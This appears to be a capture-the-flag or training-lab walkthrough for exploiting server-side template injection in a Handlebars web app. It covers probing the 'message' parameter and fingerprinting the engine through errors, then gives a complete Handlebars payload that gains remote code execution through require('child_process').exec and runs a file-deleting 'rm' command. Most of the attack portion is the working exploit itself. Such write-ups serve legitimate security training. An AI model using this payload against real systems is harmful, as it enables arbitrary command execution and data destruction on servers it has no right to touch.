1)when you try to view more details about the first product, a GET request uses the message parameter to render "Unfortunately this product is out of stock" on the home page.

2) try to inject template syntax from various different template languages, such as ${{<%[%'"}}%\, into the message parameter. 
    when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.


3) search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by @Zombiehelp54.
4) modify this exploit so that it calls require("child_process").exec("rm /home/carlos/morale.txt") as follows:

wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
